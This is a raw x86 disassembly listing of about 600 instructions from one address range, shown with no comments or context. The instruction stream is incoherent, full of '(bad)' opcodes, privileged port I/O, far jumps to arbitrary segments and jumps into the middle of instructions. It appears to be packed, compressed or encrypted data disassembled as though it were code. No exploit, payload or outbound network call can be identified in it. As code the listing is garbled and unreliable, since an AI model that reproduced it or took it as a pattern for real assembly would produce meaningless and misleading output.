  418417:	push   ebp
  418418:	addr16 xchg ebp,eax
  41841a:	rcl    BYTE PTR [ebp+0x7b],1
  41841d:	out    0x4a,eax
  41841f:	mov    al,ds:0x6e4656fa
  418424:	jbe    0x41840d
  418426:	sub    eax,0x25270e4d
  41842b:	fisttp DWORD PTR [eax]
  41842d:	pop    ecx
  41842e:	jle    0x41842c
  418430:	mov    BYTE PTR [ecx],bh
  418432:	bound  ecx,QWORD PTR [edx-0x38]
  418435:	jmp    0x5a5a3f04
  41843a:	pop    ebp
  41843b:	(bad)  [ebx-0x5d]
  41843e:	xor    ebp,ebp
  418440:	cld    
  418441:	(bad)  
  418442:	jo     0x4184ae
  418444:	fs daa 
  418446:	xchg   BYTE PTR [esi+0x19d2bb8b],dh
  41844c:	sti    
  41844d:	ins    DWORD PTR es:[di],dx
  41844f:	fsubr  DWORD PTR [ebx+ebx*8]
  418452:	jle    0x41840c
  418454:	(bad)  
  418455:	in     al,0x1
  418457:	sub    ebx,ebx
  418459:	ins    BYTE PTR es:[edi],dx
  41845a:	dec    ecx
  41845b:	xor    cl,BYTE PTR [ecx-0x3b2dd01]
  418461:	push   ebx
  418462:	pop    ecx
  418463:	or     ebp,DWORD PTR [edx]
  418465:	js     0x41848a
  418467:	gs xor eax,0xce7cf6dc
  41846d:	push   0x6ba65854
  418472:	lods   al,BYTE PTR ds:[esi]
  418473:	mov    al,ds:0x3bfd430d
  418478:	mov    ebp,edx
  41847a:	sbb    eax,0x39b138fb
  41847f:	push   ebx
  418480:	push   cs
  418481:	pop    ds
  418482:	loopne 0x41841d
  418484:	xchg   esi,eax
  418485:	call   DWORD PTR [ecx]
  418487:	retf   
  418488:	sub    ebp,DWORD PTR [edi]
  41848a:	sbb    eax,0xb75df5ea
  41848f:	je     0x418475
  418491:	inc    esi
  418492:	pop    edi
  418493:	push   0x3388d4b0
  418498:	sar    DWORD PTR [edi],1
  41849a:	sbb    cl,al
  41849c:	int3   
  41849d:	and    esp,DWORD PTR [edi+edx*1+0x256740c]
  4184a4:	xchg   ebx,eax
  4184a5:	mov    ah,0x2
  4184a7:	mov    ch,0xad
  4184a9:	out    0x2,eax
  4184ab:	(bad)  
  4184ac:	test   al,0xbc
  4184ae:	std    
  4184af:	mov    bl,0x8b
  4184b1:	jnp    0x41848b
  4184b3:	mov    eax,0x3a3453fe
  4184b8:	xchg   DWORD PTR ds:0x94a674ed,edi
  4184be:	mov    esp,0xf61ed212
  4184c3:	and    ah,BYTE PTR [edx+0x727ea903]
  4184c9:	mov    dh,0xa6
  4184cc:	dec    esp
  4184cd:	pushf  
  4184ce:	pop    ebx
  4184cf:	mov    dl,0x9b
  4184d1:	mov    cl,0x52
  4184d3:	sbb    bh,BYTE PTR [ebp+0x9]
  4184d6:	popa   
  4184d7:	dec    ebx
  4184d8:	push   ebp
  4184d9:	sbb    ebp,DWORD PTR [esi-0x3156fe80]
  4184df:	fs inc eax
  4184e1:	rcr    BYTE PTR [edi+0x67],cl
  4184e4:	in     eax,0x77
  4184e6:	pop    edi
  4184e7:	jge    0x4184a3
  4184e9:	push   ebp
  4184ea:	xchg   esp,eax
  4184eb:	add    edx,DWORD PTR [ebp-0x5]
  4184ee:	cmp    BYTE PTR [esi+ebp*1+0x72],dl
  4184f2:	add    ebp,DWORD PTR [edi+esi*8-0x3e72aa4e]
  4184f9:	xchg   ecx,eax
  4184fa:	out    dx,al
  4184fb:	mov    BYTE PTR [esi],al
  4184fd:	sbb    esp,edx
  4184ff:	lock bound esp,QWORD PTR [eax-0x6b00e98b]
  418506:	cmc    
  418507:	imul   ebx,DWORD PTR [eax],0xe2c3b35e
  41850d:	retf   
  41850e:	pop    eax
  41850f:	mov    esp,0x9a59d9c8
  418514:	adc    ebp,DWORD PTR [ebx+ebx*2+0x76c85165]
  41851b:	xchg   esp,eax
  41851c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41851d:	add    eax,0xb6f8c6e9
  418522:	fsub   QWORD PTR [edi]
  418524:	or     dh,BYTE PTR [ecx-0x212ff4f0]
  41852a:	cmp    DWORD PTR [bx+si+0xd02],eax
  41852f:	adc    al,BYTE PTR [ebx-0x7e298198]
  418535:	ror    BYTE PTR [eax-0x53e006e5],1
  41853b:	je     0x418541
  41853d:	cmp    DWORD PTR [ecx],0x1d63377c
  418543:	stc    
  418544:	outs   dx,BYTE PTR ds:[esi]
  418545:	adc    BYTE PTR [edx+0x7c],0x4a
  418549:	scas   al,BYTE PTR es:[edi]
  41854a:	sub    ebx,DWORD PTR [eax]
  41854c:	or     DWORD PTR [ebp-0x6f],ebp
  41854f:	in     al,dx
  418550:	jmp    0x7304432b
  418555:	mov    ds:0xdc6d0760,eax
  41855a:	add    DWORD PTR [esi+ebx*4+0x19],ebp
  41855e:	bound  ecx,QWORD PTR [edi]
  418560:	add    DWORD PTR [edi],esi
  418562:	mov    esp,DWORD PTR [ecx-0x27]
  418565:	ins    BYTE PTR es:[edi],dx
  418566:	pop    ds
  418567:	fist   DWORD PTR [esi]
  418569:	xor    al,BYTE PTR [ebp-0x4]
  41856c:	xchg   ebp,eax
  41856d:	and    DWORD PTR [edi],edi
  41856f:	fimul  WORD PTR [ecx]
  418571:	(bad)  
  418572:	out    dx,al
  418573:	sbb    al,0x71
  418576:	mov    ebp,0xdb4225b1
  41857b:	test   bl,0x97
  41857e:	test   ebp,eax
  418580:	mov    esp,0x7f156383
  418585:	out    0xbf,eax
  418587:	mov    esp,0xe09216ac
  41858c:	cmp    BYTE PTR [eax+ebp*1],bh
  41858f:	popa   
  418590:	and    DWORD PTR [ecx-0x69],esi
  418593:	jno    0x418609
  418595:	jb     0x41853f
  418597:	push   esi
  418598:	test   eax,0xd82512cb
  41859d:	cmp    DWORD PTR [ebx+0x70],ebp
  4185a0:	iret   
  4185a1:	aad    0x3f
  4185a3:	cmc    
  4185a4:	sbb    al,0x3
  4185a6:	mov    BYTE PTR [edi+0x2a],al
  4185a9:	fmul   QWORD PTR [ebx-0x46601132]
  4185af:	stos   BYTE PTR es:[edi],al
  4185b0:	retf   0xae6d
  4185b3:	out    dx,eax
  4185b4:	add    al,dh
  4185b6:	jbe    0x4185cc
  4185b8:	jecxz  0x418638
  4185ba:	sbb    esi,DWORD PTR [edx+esi*2-0x1b72a270]
  4185c1:	xor    DWORD PTR ss:[ebp+0x7e],esp
  4185c5:	adc    eax,0x9853272f
  4185ca:	push   ss
  4185cb:	popa   
  4185cc:	push   ebp
  4185cd:	or     eax,0xe0ff4caf
  4185d2:	xor    al,0x98
  4185d4:	and    BYTE PTR [edx+0xafead2],0x54
  4185db:	cmp    eax,0x2455f3cc
  4185e0:	pushf  
  4185e1:	call   0x6f62e7d7
  4185e6:	sbb    al,0xf4
  4185e8:	mov    al,ds:0xc8fc715
  4185ed:	cmp    BYTE PTR [ecx+0x7d7603f3],dl
  4185f3:	adc    DWORD PTR [ebp+0x43],edi
  4185f6:	addr16 je 0x4185f9
  4185f9:	aas    
  4185fa:	jae    0x418639
  4185fc:	push   0xa4528587
  418601:	call   0xc45f:0xf478374f
  418608:	fcom   DWORD PTR [esi-0x5555019e]
  41860e:	jg     0x41864a
  418610:	and    ebp,DWORD PTR [eax-0x7c]
  418613:	push   ds
  418614:	mov    esi,0x59cfe537
  418619:	mov    eax,esp
  41861b:	pop    esi
  41861c:	sub    edi,esp
  41861e:	shr    DWORD PTR [esi],cl
  418620:	jmp    0xf98a:0x2cf4e22b
  418627:	int3   
  418628:	pusha  
  418629:	clc    
  41862a:	fcomp  st(4)
  41862c:	loopne 0x4185cd
  41862e:	shl    edx,0x25
  418631:	arpl   bp,cx
  418633:	mov    ds:0x27848eb6,eax
  418638:	add    dh,BYTE PTR [esi]
  41863a:	pop    ds
  41863b:	push   esp
  41863c:	mov    dl,BYTE PTR [eax]
  41863e:	ret    
  41863f:	push   esp
  418640:	add    DWORD PTR [eax+ebp*8-0x1a],esi
  418644:	cs push edx
  418646:	sbb    eax,0xa9820a1
  41864b:	xchg   ebp,eax
  41864c:	ins    DWORD PTR es:[edi],dx
  41864d:	pop    esi
  41864e:	js     0x41867b
  418650:	dec    edx
  418651:	cwde   
  418652:	daa    
  418653:	mov    WORD PTR [edi-0x24],es
  418656:	sub    eax,0x6631fb19
  41865b:	mov    DWORD PTR [ebx+0x1a],edi
  41865e:	add    eax,0x471ab8c5
  418663:	jb     0x418671
  418665:	jmp    0xd563:0xb76c8f2d
  41866c:	ret    0xc0cc
  41866f:	pop    edi
  418670:	dec    eax
  418671:	dec    esi
  418672:	in     eax,dx
  418673:	nop
  418674:	test   DWORD PTR [ecx],0xa4d2434b
  41867a:	mov    cl,0xaa
  41867c:	mov    al,bh
  41867e:	dec    ebx
  41867f:	xchg   BYTE PTR [esi+0x61569924],cl
  418685:	sbb    edx,DWORD PTR [ecx+0x1e]
  418688:	add    al,0x7a
  41868a:	in     al,0x90
  41868c:	sub    BYTE PTR [ebx],ch
  41868e:	pop    ecx
  41868f:	stos   BYTE PTR es:[edi],al
  418690:	jns    0x41865e
  418692:	and    eax,0x3e553d8e
  418697:	lods   eax,DWORD PTR ds:[esi]
  418698:	mov    esp,0xb1f2f566
  41869d:	sub    eax,DWORD PTR [edx]
  41869f:	pusha  
  4186a0:	enter  0xc4f0,0xa4
  4186a4:	sub    DWORD PTR [edx+0x7c38e1b9],0x28
  4186ab:	imul   eax,DWORD PTR [ecx-0x3ad07029],0x139cc0fe
  4186b5:	xchg   edi,eax
  4186b6:	mov    DWORD PTR [eax-0x5b],ecx
  4186b9:	cmp    eax,0xea4deeee
  4186be:	xchg   DWORD PTR [edi-0x76ed6986],ebp
  4186c4:	pop    ss
  4186c5:	pop    ds
  4186c6:	jle    0x4186e4
  4186c8:	xlat   BYTE PTR ds:[ebx]
  4186c9:	(bad)  
  4186ca:	jmp    0x41870e
  4186cc:	fisub  DWORD PTR [edi]
  4186ce:	jle    0x41874d
  4186d0:	adc    BYTE PTR [ebx+0x77],bh
  4186d3:	mov    ebx,0xc7425b4c
  4186d8:	push   ecx
  4186d9:	arpl   WORD PTR [eax+0x1de8cf55],sp
  4186df:	xchg   ebx,ebp
  4186e1:	fadd   st,st(5)
  4186e3:	rol    DWORD PTR [edi+eiz*2-0x2f2db9d0],1
  4186ea:	adc    bl,BYTE PTR [edi]
  4186ec:	and    al,0xa6
  4186ee:	mov    ch,0xac
  4186f0:	mov    edi,0x7b6f54d3
  4186f5:	(bad)
  4186f9:	addr16 sub eax,0xdcfd7efe
  4186ff:	adc    eax,0x16d35107
  418704:	lods   eax,DWORD PTR ds:[esi]
  418705:	enter  0xd3ad,0x7c
  418709:	mov    ch,0xa2
  41870b:	jecxz  0x4186bd
  41870d:	addr16 nop
  41870f:	jmp    0x50d9:0x99d02c18
  418716:	test   al,0x55
  418718:	fistp  QWORD PTR [edx-0x37a5d551]
  41871e:	cmp    eax,0x376a5ce
  418723:	pop    edi
  418724:	stc    
  418725:	shl    DWORD PTR [edx],cl
  418727:	mov    eax,ds:0xee79c233
  41872c:	arpl   WORD PTR [eax+0xeacc291],ax
  418732:	jno    0x41879a
  418734:	inc    esi
  418735:	sti    
  418736:	jb     0x418758
  418738:	jnp    0x418744
  41873a:	out    dx,al
  41873b:	and    al,0x7b
  41873d:	fcom   DWORD PTR [edx]
  41873f:	mov    ah,0x3d
  418741:	out    0xc3,al
  418743:	maxps  xmm1,xmm2
  418746:	inc    edx
  418747:	pop    eax
  418748:	xor    bl,ah
  41874a:	and    al,0x4a
  41874c:	(bad)  
  41874d:	inc    DWORD PTR ds:0xad6dee5b
  418753:	pop    ecx
  418754:	add    DWORD PTR [esi],ebx
  418756:	mov    DWORD PTR [ebx+0x5eb65374],esi
  41875c:	cld    
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	rol    DWORD PTR [ebp-0xab00e39],0xd
  418765:	cmp    edx,esp
  418767:	pop    ss
  418768:	int3   
  418769:	shl    BYTE PTR ds:0xfe674363,0x9
  418770:	xlat   BYTE PTR ds:[ebx]
  418771:	ins    DWORD PTR es:[edi],dx
  418772:	mov    al,BYTE PTR [ecx]
  418774:	outs   dx,BYTE PTR ds:[esi]
  418775:	aas    
  418776:	outs   dx,BYTE PTR ds:[esi]
  418777:	mov    ds,esi
  418779:	scas   eax,DWORD PTR es:[edi]
  41877a:	or     al,BYTE PTR [eax+0x4860fd25]
  418780:	add    BYTE PTR [ebp+0x5354ddfc],ah
  418786:	sbb    eax,DWORD PTR [edi+edx*1-0x7d]
  41878a:	call   0x7e8c:0xa53058dc
  418791:	mov    cl,0xb7
  418793:	xor    ecx,DWORD PTR [eax]
  418795:	jmp    0xe46d7ccc
  41879a:	adc    bh,BYTE PTR [edx+0x7a]
  41879d:	sub    al,0x33
  41879f:	rol    DWORD PTR [ebp-0x10dbb14f],0xbc
  4187a6:	and    edi,DWORD PTR [ebx-0x5f]
  4187a9:	sbb    al,0x13
  4187ab:	push   ss
  4187ac:	dec    esp
  4187ad:	mov    ch,0xdd
  4187af:	pop    ds
  4187b0:	mov    bh,0xeb
  4187b2:	in     al,dx
  4187b3:	call   0x584b:0xced7e404
  4187ba:	lods   al,BYTE PTR ds:[esi]
  4187bb:	js     0x418798
  4187bd:	inc    edx
  4187be:	push   ss
  4187bf:	or     BYTE PTR [ebx+0x6c],dh
  4187c2:	icebp  
  4187c3:	xchg   ebp,eax
  4187c4:	stc    
  4187c5:	mov    dh,0x9d
  4187c7:	pop    ebx
  4187c8:	pusha  
  4187c9:	les    esp,FWORD PTR [esi-0x66111eae]
  4187cf:	mov    ds:0x52e03b73,al
  4187d4:	daa    
  4187d5:	mov    DWORD PTR [ebp+0x74],0x70964168
  4187dc:	lea    esp,[esi+0x49a6174c]
  4187e2:	mov    al,ds:0xa949f597
  4187e7:	sub    DWORD PTR [edi-0x2860d025],ecx
  4187ed:	je     0x4187ac
  4187ef:	and    edx,eax
  4187f1:	out    0xab,al
  4187f3:	fsubrp st(7),st
  4187f5:	sti    
  4187f6:	jb     0x418830
  4187f8:	hlt    
  4187f9:	sti    
  4187fa:	pop    ds
  4187fb:	sbb    eax,0xa7774559
  418800:	mov    BYTE PTR [ecx+esi*4-0x52],bh
  418804:	loopne 0x418865
  418806:	jle    0x41879e
  418808:	addr16 xchg bh,bh
  41880b:	gs loop 0x418809
  41880e:	ins    DWORD PTR es:[edi],dx
  41880f:	and    eax,0x905a9ff8
  418814:	popa   
  418815:	pop    ds
  418816:	(bad)  
  418817:	or     ecx,DWORD PTR [ebx+0x62]
  41881a:	repz pop ecx
  41881c:	ss adc ecx,eax
  41881f:	rcr    esi,0xf9
  418822:	add    bh,ah
  418824:	clc    
  418825:	test   BYTE PTR [esi],dl
  418827:	dec    eax
  418828:	lock pushf 
  41882a:	jl     0x418888
  41882c:	shr    dl,cl
  41882e:	es pop cx
  418831:	mov    ds:0x1d64b8b4,al
  418836:	mov    eax,ds:0x95e10f6e
  41883b:	push   ecx
  41883c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41883d:	mov    ds:0x7430be32,eax
  418842:	(bad)  
  418843:	shl    BYTE PTR [esi+0x38dc27ef],1
  418849:	jge    0x41885d
  41884b:	xchg   ebp,eax
  41884c:	push   ecx
  41884d:	test   al,0x63
  41884f:	cmp    bl,BYTE PTR [ebx-0x361d983c]
  418855:	sbb    ecx,DWORD PTR [ebp+0x4673641]
  41885b:	and    DWORD PTR [ebx+0x18e45712],edi
  418861:	jbe    0x41886c
  418863:	pop    edx
  418864:	cmp    DWORD PTR [esi],edx
  418866:	hlt    
  418867:	adc    eax,0x5b4e37be
  41886c:	xchg   ebx,eax
  41886d:	call   0xc356519a
  418872:	push   ss
  418873:	ins    BYTE PTR es:[edi],dx
  418874:	outs   dx,BYTE PTR ds:[esi]
  418875:	cmp    edi,DWORD PTR [esi]
  418877:	sbb    eax,DWORD PTR [esp+ebp*8+0x16]
  41887b:	rcl    dh,1
  41887d:	cdq    
  41887e:	sbb    BYTE PTR [edi-0x50bbf5a1],dh
  418884:	push   0xffffff98
  418886:	in     al,dx
  418887:	sbb    esi,DWORD PTR [eax]
  418889:	xchg   ecx,eax
  41888a:	xchg   ch,dl
  41888c:	jmp    0xfababb94
  418891:	retf   
  418892:	inc    edx
  418893:	adc    BYTE PTR [edi+0x22ee317e],bl
  418899:	mov    WORD PTR [edx+0x23],ss
  41889c:	dec    edi
  41889d:	test   eax,0x6f8b5838
  4188a2:	jns    0x41882b
  4188a4:	cmp    BYTE PTR [ebx],0x37
  4188a7:	data16 aad 0x1c
  4188aa:	push   eax
  4188ab:	pop    edi
  4188ac:	out    dx,al
  4188ad:	ret    
  4188ae:	and    al,0x5d
  4188b0:	and    eax,0x2c4ddfce
  4188b5:	xchg   ebx,eax
  4188b6:	aam    0xa3
  4188b8:	sub    ebp,DWORD PTR ds:[edi-0x32]
  4188bc:	ret    0x179
  4188bf:	retf   0x45e3
  4188c2:	aam    0x31
  4188c4:	xchg   esi,eax
  4188c5:	xchg   ebx,eax
  4188c6:	jno    0x418849
  4188c8:	and    eax,0x9681428c
  4188cd:	cdq    
  4188ce:	jno    0x41889a
  4188d0:	push   ebp
  4188d1:	enter  0x752e,0x7f
  4188d5:	mov    ah,0x69
  4188d7:	cmp    DWORD PTR [ebx],ebp
  4188d9:	xbegin 0xe7de11e3
  4188df:	nop
  4188e0:	clc    
  4188e1:	jge    0x41894c
  4188e3:	pop    esi
  4188e4:	sbb    edx,DWORD PTR ds:0xe302e3af
  4188ea:	cmc    
  4188eb:	retf   0x43e8
  4188ee:	fs test dh,cl
  4188f1:	push   cs
  4188f2:	sbb    cl,bl
  4188f4:	aas    
  4188f5:	stc    
  4188f6:	leave  
  4188f7:	aad    0x12
  4188f9:	sub    DWORD PTR [edx],esi
  4188fb:	std    
  4188fc:	and    al,0x42
  4188fe:	mov    cl,0x4b
  418900:	das    
  418901:	push   ds
  418902:	adc    al,0xad
  418904:	ror    DWORD PTR [edx],1
  418906:	push   ss
  418907:	cmc    
  418908:	daa    
  418909:	or     eax,0xa3975c92
  41890e:	jae    0x418921
  418910:	out    0x2a,eax
  418912:	leave  
  418913:	adc    al,0xc
  418915:	call   0x2310:0xb32c813a
  41891c:	mov    ebx,0xdea4a725
  418921:	fistp  WORD PTR [ecx+0x40]
  418924:	jmp    0x3ea0e673
  418929:	pop    ds
  41892a:	mov    bh,0x55
  41892c:	sar    BYTE PTR [edx],1
  41892e:	add    bh,cl
  418930:	jmp    0xd6ce1f5b
  418935:	jo     0x418978
  418937:	test   DWORD PTR [esi],ebp
  418939:	daa    
  41893a:	mov    esp,0x9b7261ce
  41893f:	rol    DWORD PTR [edx],cl
  418941:	fdiv   DWORD PTR [edx+edx*2+0x329d2ae6]
  418948:	rcl    DWORD PTR [edi-0x1f6ef8e4],0xae
  41894f:	bound  edx,QWORD PTR [edx+0x16]
  418952:	and    al,0xd8
  418954:	(bad)  
  418955:	mov    bl,0x0
  418957:	shr    DWORD PTR [esi],1
  418959:	adc    DWORD PTR [ebp+0x1f],0x9494f146
  418960:	push   es
  418961:	cli    
  418962:	add    ch,ah
  418964:	sub    DWORD PTR [ebp+0x35],esp
  418967:	jns    0x4189a7
  418969:	push   es
  41896a:	inc    ebp
  41896b:	das    
  41896c:	fild   DWORD PTR [ebp-0x1a019b39]
  418972:	sbb    al,0xf
  418974:	fcomp  DWORD PTR [edx]
  418976:	cmp    al,0x4a
  418978:	push   edx
  418979:	and    bh,BYTE PTR [edi-0x16]
  41897c:	mov    dh,0x46
  41897e:	xchg   edi,eax
  41897f:	inc    ebx
  418980:	cli    
  418981:	pop    edx
  418982:	fcmovnbe st,st(2)
  418984:	xchg   esi,eax
  418985:	test   DWORD PTR [esp+ebx*2],ecx
  418988:	jnp    0x4189c8
  41898a:	dec    esp
  41898b:	retf   
  41898c:	pop    ds
  41898d:	mov    dl,BYTE PTR [eax-0x3be287da]
  418993:	jecxz  0x4189ef
  418995:	aad    0xa2
  418997:	pop    ss
  418998:	xor    eax,0xa16ccaab
  41899d:	stc    
  41899e:	popa   
  41899f:	shl    DWORD PTR [ebx+0xb],1
  4189a2:	(bad)
  4189a6:	sbb    ch,dh
  4189a8:	mov    ecx,0x548f3beb
  4189ad:	lea    edi,[esi+eiz*4+0x76]
  4189b1:	push   edx
  4189b2:	sar    DWORD PTR [edx-0x1f],cl
  4189b5:	jmp    0x3039:0xb87becee
  4189bc:	mov    eax,0x703967aa
  4189c1:	mov    ah,0x18
  4189c3:	imul   esi,DWORD PTR [eax],0x87e82948
  4189c9:	ss dec eax
  4189cb:	in     al,0xc6
  4189cd:	stos   BYTE PTR es:[edi],al
  4189ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189cf:	(bad)  
  4189d0:	jns    0x418986
  4189d2:	pop    ebx
  4189d3:	sub    cl,ch
  4189d5:	adc    bh,al
  4189d7:	pop    ss
  4189d8:	dec    ebp
  4189d9:	(bad)  
  4189db:	stos   BYTE PTR es:[edi],al
  4189dc:	mov    ?,WORD PTR [edi+0x6bcc62a8]
  4189e2:	jo     0x4189d0
  4189e4:	in     eax,dx
  4189e5:	(bad)  
  4189e6:	icebp  
  4189e7:	fsqrt  
  4189e9:	xchg   ebx,eax
  4189ea:	dec    eax
  4189eb:	mov    WORD PTR [ebp-0x2b41a5fe],ss
  4189f1:	(bad)  
  4189f2:	fmul   DWORD PTR [eax+0x59a43a8f]
  4189f8:	xor    edi,DWORD PTR [esi-0x7c13a874]
  4189fe:	sub    eax,0x97c61990
  418a03:	dec    esp
  418a04:	xchg   edx,eax
  418a05:	add    al,0xc5
  418a07:	sub    DWORD PTR [eax+0x45bc9f38],edx
  418a0d:	xchg   edx,eax
  418a0e:	mov    ch,0xe9
  418a10:	in     eax,dx
  418a11:	inc    edi
  418a12:	ins    BYTE PTR es:[edi],dx
  418a13:	add    DWORD PTR [ebp-0x6563929e],eax
  418a19:	sbb    dh,BYTE PTR [edi-0x3f92e336]
  418a1f:	out    0xd6,eax
  418a21:	sbb    edi,DWORD PTR [eax+0xc7dfd4e]
  418a27:	push   ds
  418a28:	out    0x16,al
  418a2a:	mov    al,ds:0xf6c0a48
  418a2f:	push   edx
  418a30:	popf   
  418a31:	inc    edi
  418a32:	mov    edx,0x83677e67
  418a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a38:	shl    BYTE PTR [ecx+0x304c4b52],1
  418a3e:	aam    0x49
  418a40:	sbb    BYTE PTR [edx+ebx*2],cl
  418a43:	test   edi,edi
  418a45:	(bad)  
  418a46:	fstp   QWORD PTR [eax]
  418a48:	pop    ds
  418a49:	mov    dl,0x19
  418a4b:	pop    ebx
  418a4c:	pop    ds
  418a4d:	sbb    ah,cl
  418a4f:	or     edx,ecx
  418a51:	xchg   esp,eax
  418a52:	push   ecx
  418a53:	dec    ebp
  418a54:	push   eax
  418a55:	pop    edx
  418a56:	hlt    
  418a57:	and    al,0x72
  418a59:	or     al,BYTE PTR [edi]
  418a5b:	outs   dx,DWORD PTR ds:[esi]
  418a5c:	add    DWORD PTR [esi-0x36],edi
  418a5f:	out    dx,al
  418a60:	dec    ebx
  418a61:	jge    0x4189f7
  418a63:	xor    al,0xde
  418a65:	imul   edx
  418a67:	sub    al,0xf8
  418a69:	imul   ebx,DWORD PTR [ebp-0x64],0x7a
  418a6d:	ror    BYTE PTR [esi+0x6d],1
  418a70:	cmp    ebx,DWORD PTR [eax]
  418a72:	mov    esp,0xc94eeb41
  418a77:	call   0x5abc:0x9c1a588c
  418a7e:	xchg   ebx,eax
  418a7f:	inc    si
  418a81:	ds jae 0x418a82
  418a84:	jne    0x418aa7
  418a86:	loope  0x418aa6
  418a88:	fisubr DWORD PTR [edi+0x45aa4db6]
  418a8e:	pop    edx
  418a8f:	int3   
  418a90:	adc    ebp,DWORD PTR [ecx-0x44dde74]
  418a96:	mov    dl,0xad
  418a98:	mov    cs,ebx
  418a9a:	cmp    eax,0x50b02cf9
  418a9f:	sub    eax,0xfe3ac5d7
  418aa4:	in     eax,0xe1
  418aa6:	jmp    0x8cb5b863
  418aab:	call   0x710:0x1dae320d
  418ab2:	icebp  
  418ab3:	inc    esi
  418ab4:	xchg   BYTE PTR [eax+ebx*8-0x37],bl
  418ab8:	in     al,0x38
  418aba:	ins    BYTE PTR es:[edi],dx
  418abb:	cmp    eax,0x3a4e6ff7
  418ac0:	mov    edi,0xfcba3a3f
  418ac5:	or     al,0xe1
  418ac7:	(bad)  [ebp+0x49]
  418aca:	(bad)  
  418acb:	adc    DWORD PTR [esi+eax*8-0x6],ebp
  418acf:	aam    0x1
  418ad1:	push   0x1f
  418ad3:	inc    edi
  418ad4:	mov    al,0xe4
  418ad6:	jp     0x418ab8
  418ad8:	pop    edx
  418ad9:	adc    al,0x7
  418adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418adc:	leave  
  418add:	mov    esp,DWORD PTR [edx+0x3b]
  418ae0:	xor    al,0xf5
  418ae2:	mov    esi,0xeae9cdf8
  418ae7:	mov    bh,0x7e
  418ae9:	scas   al,BYTE PTR es:[edi]
  418aea:	push   ss
  418aeb:	sbb    dh,BYTE PTR [edi]
  418aed:	jno    0x418ad3
  418aef:	mov    esp,0xbdd01590
  418af4:	repz call 0x14ab13c9
  418afa:	inc    edx
  418afb:	push   es
  418afc:	enter  0xf4e9,0x85
  418b00:	jmp    0x418aac
  418b02:	ins    BYTE PTR es:[edi],dx
  418b03:	aas    
  418b04:	and    al,0x6
  418b06:	outs   dx,BYTE PTR ds:[esi]
  418b07:	into   
  418b08:	push   esi
  418b09:	mov    dl,0x88
  418b0b:	xlat   BYTE PTR ds:[ebx]
  418b0c:	repnz test al,0x9c
  418b0f:	aad    0x49
  418b11:	mov    BYTE PTR [ebx+ecx*4],dl
  418b14:	dec    edi
  418b15:	mul    BYTE PTR [edx+ebx*2+0x4cbcfe80]
  418b1c:	out    0x1d,eax
  418b1e:	icebp  
  418b1f:	not    al
  418b21:	lock adc al,0x98
  418b24:	sub    al,0x90
  418b26:	not    cl
  418b28:	jl     0x418b51
  418b2a:	out    dx,eax
  418b2b:	fwait
  418b2c:	or     al,0x4b
  418b2e:	add    eax,esi
  418b30:	inc    ebx
  418b31:	xlat   BYTE PTR ds:[ebx]
  418b32:	sub    bl,BYTE PTR [ebp+0x69]
  418b35:	sbb    al,0xb
  418b37:	std    
  418b38:	push   0xffffff84
  418b3a:	sub    eax,0x6d68501e
  418b3f:	es call 0xdb80:0xce6eac31
  418b47:	imul   edi,esi,0xba4f9e01
  418b4d:	pop    eax
  418b4e:	mov    WORD PTR [edx+0x55a1451b],?
  418b54:	jmp    0xe013:0x845a835f
  418b5b:	push   ecx
  418b5c:	ss shr dh,1
  418b5f:	push   es
  418b60:	ins    DWORD PTR es:[edi],dx
  418b61:	add    ebp,DWORD PTR [ebx]
  418b63:	inc    esp
  418b64:	cmp    bh,bl
  418b66:	add    edx,DWORD PTR [edx+0x6f]
  418b69:	cmp    ah,BYTE PTR [edx+0x5384f099]
  418b6f:	xchg   ebp,eax
  418b70:	or     ch,BYTE PTR [ebx+0x66]
  418b73:	mov    ah,BYTE PTR [ebp+eiz*1+0x3c9bc1c1]
  418b7a:	je     0x418b26
  418b7c:	pop    es
  418b7d:	cdq    
  418b7e:	in     eax,0x4e
  418b80:	jne    0x418b3e
  418b82:	cmp    BYTE PTR [esi],cl
  418b84:	xlat   BYTE PTR ds:[ebx]
  418b85:	gs jbe 0x418bcc
  418b88:	push   esp
  418b89:	arpl   WORD PTR [edx+eiz*2-0xf744618],dx
  418b90:	push   edi
  418b91:	cmp    al,0x6e
  418b93:	retf   0x157d
  418b96:	cli    
  418b97:	jg     0x418bbf
  418b99:	add    DWORD PTR [ebp-0x19d80ecc],edx
  418b9f:	int3   
  418ba0:	jno    0x418c09
  418ba2:	cmp    DWORD PTR [edi-0x50],ecx
  418ba5:	out    0xdc,eax
  418ba7:	iret   
  418ba8:	fld    TBYTE PTR [ecx-0x14]
  418bab:	push   ecx
  418bac:	test   eax,0x12a5729f
  418bb1:	dec    ebx
  418bb2:	clc    
  418bb3:	mov    cl,0x8d
  418bb5:	xor    al,0xf8
  418bb7:	jmp    0xd740:0xef245c75
  418bbe:	ds jp  0x418b9f
  418bc1:	adc    DWORD PTR [edx],esp
  418bc3:	pop    ss
  418bc4:	js     0x418b89
  418bc6:	xchg   esi,eax
  418bc7:	lock aam 0x3b
  418bca:	adc    BYTE PTR [edi-0x6d],bl
  418bcd:	or     BYTE PTR [edx],0xc6
  418bd0:	std    
  418bd1:	adc    DWORD PTR [edx+ebp*4-0x2a04856d],ecx
  418bd8:	adc    dl,BYTE PTR [esi-0x6c]
  418bdb:	stos   DWORD PTR es:[edi],eax
  418bdc:	and    eax,0x720d56c0
  418be1:	outs   dx,BYTE PTR ds:[esi]
  418be2:	xor    eax,0xbc931fc4
  418be7:	sbb    edi,DWORD PTR [edx]
  418be9:	in     al,dx
  418bea:	shl    DWORD PTR [esi+0xc],1
  418bed:	out    dx,eax
  418bee:	popf   
  418bef:	and    BYTE PTR [edi-0x20963f36],al
  418bf5:	sub    ebx,esi
  418bf7:	adc    al,0xb1
  418bf9:	stos   BYTE PTR es:[edi],al
  418bfa:	adc    DWORD PTR [edx],ebp
  418bfc:	out    0x4c,eax
  418bfe:	xchg   edi,eax
  418bff:	mov    edx,db4
  418c02:	in     al,0x71
  418c04:	push   esi
  418c05:	push   ds
  418c06:	jno    0x418c7d
  418c08:	sbb    BYTE PTR [edi+0x614eb4cf],0xf8
  418c0f:	xor    DWORD PTR ds:0x5660e9ff,esp
  418c15:	pop    esp
  418c16:	mov    cl,0xc5
  418c18:	jmp    0x418c02
  418c1a:	or     eax,DWORD PTR [esi]
